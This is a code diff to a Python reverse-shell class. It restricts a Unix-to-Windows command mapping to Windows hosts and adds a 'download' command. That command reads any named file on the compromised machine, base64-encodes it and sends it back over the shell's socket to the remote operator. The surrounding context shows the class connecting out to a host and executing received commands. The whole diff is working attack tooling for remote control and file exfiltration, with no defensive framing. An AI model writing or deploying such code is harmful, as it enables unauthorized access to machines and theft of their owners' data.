@@ -15,15 +15,18 @@ class ReverseShell:
         self.thread = None
         self._stop_event = threading.Event()
         
-        # Command Mapping for cross-platform feel
-        self.MAPPED_COMMANDS = {
-            "ls": "dir",
-            "pwd": "echo %cd%",
-            "clear": "cls",
-            "ifconfig": "ipconfig",
-            "cat": "type",
-            "grep": "findstr"
-        }
+        # Command Mapping for cross-platform feel (Only for Windows)
+        if sys.platform == "win32":
+            self.MAPPED_COMMANDS = {
+                "ls": "dir",
+                "pwd": "echo %cd%",
+                "clear": "cls",
+                "ifconfig": "ipconfig",
+                "cat": "type",
+                "grep": "findstr"
+            }
+        else:
+             self.MAPPED_COMMANDS = {} # Native commands on macOS/Linux
 
     def _connect_and_shell(self):
         self.status = f"CONNECTING TO {self.host}..."
@@ -73,6 +76,23 @@ class ReverseShell:
                             self.sock.send(response.encode("utf-8"))
                         except Exception as e:
                             self.sock.send(f"CD Error: {str(e)}\n".encode("utf-8"))
+                        continue
+
+                    # Handle download
+                    if data.lower().startswith("download "):
+                        filename = data[9:].strip()
+                        try:
+                            file_path = os.path.join(os.getcwd(), filename)
+                            if os.path.exists(file_path):
+                                import base64
+                                with open(file_path, "rb") as f:
+                                    content = f.read()
+                                    encoded = base64.b64encode(content).decode("utf-8")
+                                    self.sock.send(f"[FILE_BEGIN:{filename}]{encoded}[FILE_END]\n".encode("utf-8"))
+                            else:
+                                self.sock.send(f"Error: File '{filename}' not found.\n".encode("utf-8"))
+                        except Exception as e:
+                            self.sock.send(f"Download Error: {str(e)}\n".encode("utf-8"))
                         continue
 
                     # Execute command
